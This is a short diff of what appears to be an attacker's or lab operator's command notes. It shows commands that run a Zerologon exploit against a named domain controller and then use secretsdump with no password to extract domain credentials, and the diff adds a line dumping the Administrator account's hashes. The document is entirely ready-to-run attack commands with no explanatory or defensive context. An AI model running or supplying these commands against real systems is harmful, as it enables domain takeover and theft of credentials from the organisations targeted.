@@ -18,3 +18,5 @@ rbenv install 3.1.2
 python3 zerologon.py -do EXPLOIT -target EC2AMAZ-8SFMEJU -ip 192.168.1.2
 python3 secretsdump.py -just-dc -no-pass EC2AMAZ-8SFMEJU\$@192.168.1.2
 
+python3 secretsdump.py -just-dc-user Administrator -no-pass EC2AMAZ-8SFMEJU\$@192.168.1.2
+
